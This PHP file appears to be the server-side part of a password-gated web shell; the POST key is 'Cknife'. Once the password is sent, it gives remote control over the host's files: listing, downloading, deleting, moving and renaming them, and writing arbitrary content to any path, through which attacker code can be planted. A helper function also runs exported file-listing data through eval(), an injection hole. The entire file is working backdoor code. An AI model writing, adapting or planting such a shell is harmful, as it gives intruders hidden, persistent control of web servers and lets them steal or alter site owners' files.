<?php
header("Content-type: text/html; charset=utf-8");
include "file.php";
 

$pwd = 'Cknife';
// write("post.log",var_export($_POST,TRUE));
if ($_POST [$pwd] == 1) {
	$act = $_POST ['action'];
	$root_folder = dirname(__FILE__); // 获取当前网站的当前地址
	$api = new PHPFileSystem($root_folder);
	$api->virtualRoot("Files");
	if ($act == 'index') {
	} else if ($act == 'readdict') {
			$arr = $api->ls("/", true);
			$_tmparr = array_iconv('gbk','utf-8',$arr);
			echo json_encode($_tmparr);
			exit;
	} else  if ($act == 'rename') {
		$m = get_magic_quotes_gpc();
		$src = $m ? stripslashes($_POST["z1"]) : $_POST["z1"];
		$dst = $m ? stripslashes($_POST["z2"]) : $_POST["z2"];
		echo json_encode( $api->rename($src, $dst) );
	}else if ($act =='upload') {
		echo file_put_contents(stripslashes($_POST['z1']),$_POST['z2']);
	}else if ($act == 'delete') {
		echo json_encode( $api->batch($_POST["z1"], array($api, "rm")) );
	}else if ($act == 'download') {
		$info = $api->download($_POST["z1"]);
		echo json_encode(['filename'=>$info->getName(),'content'=> base64_encode($info->getContent())]);
	}else if ($act == 'create'){
		echo json_encode( $api->mkdir($_POST["z1"], $_POST["z2"]) );
	}else if ($act == 'move') {
		echo json_encode( $api->batch($_POST["z1"], array($api, "mv"), $_POST["z2"]) );
	}else if ($act == 'copy') {
		echo json_encode( $api->batch($_POST["z1"], array($api, "cp"), $_POST["z2"]) );
	}else if ($act == 'search') {
		echo json_encode( $api->find($_POST["z1"],$_POST["z2"]));
	}
	exit;
}
function array_iconv($in_charset,$out_charset,$arr){      
        return eval('return '.iconv($in_charset,$out_charset,var_export($arr,true)).';');      
}    
function  write($name,$content)
{
	return file_put_contents($name,$content."\n", FILE_APPEND);	
}
?>

